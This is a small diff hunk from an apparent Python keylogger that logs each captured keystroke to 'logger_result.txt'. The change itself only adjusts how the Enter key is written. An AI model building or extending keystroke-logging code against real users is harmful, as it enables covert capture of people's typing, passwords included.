@@ -15,7 +15,7 @@ def pressed(key):
         key_pressed = format(key)
         with open("logger_result.txt", "a") as file:
             if key_pressed == "key.enter":
-                file.write('\n')
+                file.write('\n ')
             if key_pressed == "Key.space":
                 file.write(" ")
 
